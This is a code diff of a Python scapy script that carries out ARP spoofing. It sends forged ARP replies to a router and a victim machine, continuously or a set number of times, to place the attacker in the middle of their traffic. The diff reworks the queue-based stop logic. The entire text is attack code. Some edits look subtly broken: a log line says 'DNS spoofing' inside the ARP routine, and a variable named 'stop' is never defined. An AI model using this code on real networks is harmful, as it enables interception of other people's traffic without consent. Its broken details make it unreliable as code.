@@ -1,16 +1,16 @@
 from scapy.all import *
-import Queue as q
+import Queue as que
 
 
-que = q.Queue()
+queue = que.Queue()
 
 
-def put_q(put):
-    que.put(put)
+def put_qu(put):
+    queue.put(put)
 
 
-def get_q():
-    que.get(False)
+def get_qu():
+    queue.get(False)
 
 
 # activate by typing in terminal sudo python scanning.py
@@ -67,29 +67,24 @@ def arp_spoofing(ip_router, mac_router, ip_vic, mac_vic, s, number, allOut):
     print("[*] Started ARP poison attack [CTRL-C to stop]")
     if mode=="all out":
         while 1:
-            send(ARP(op=2, pdst=ip_router, hwdst=mac_router, psrc=ip_vic, hwsrc=mac_me))
-            send(ARP(op=2, pdst=ip_vic, hwdst=mac_vic, psrc=ip_router, hwsrc=mac_me))
-            time.sleep(2)
             try:
-                message = que.get(False)
-                if message == "stop arp":
-                    logger.info("Stopping ARP spoofing")
+                message = queue.get(False)
+                if message == "stop":
+                    logger.info("Stopping DNS spoofing")
                     break
                 else:
-                    que.put(message)
-            except:
-                q.Empty
+                    queue.put(message)
+            except que.Empty:
+                send(ARP(op=2, pdst=ip_router, hwdst=mac_router, psrc=ip_vic, hwsrc=mac_me))
+                send(ARP(op=2, pdst=ip_vic, hwdst=mac_vic, psrc=ip_router, hwsrc=mac_me))
+                time.sleep(2)
         sys.exit(0)
-    elif s:
+    elif mode!="all out":
         for i in range(0, number):
             send(ARP(op=2, pdst=ip_router, hwdst=mac_router, psrc=ip_vic, hwsrc=mac_me))
             send(ARP(op=2, pdst=ip_vic, hwdst=mac_vic, psrc=ip_router, hwsrc=mac_me))
             time.sleep(2)
-        # while s==False:
-        #     send(ARP(op=2, pdst=ip_router, hwdst=mac_router, psrc=ip_vic, hwsrc=mac_me))
-        #     send(ARP(op=2, pdst=ip_vic, hwdst=mac_vic, psrc=ip_router, hwsrc=mac_me))
-        #     time.sleep(2)
-    elif not s:
+    if not stop:
         print("[*] Stopped ARP poison attack. Restoring network")
         restoring(ip_router, mac_router, ip_vic, mac_vic)
 
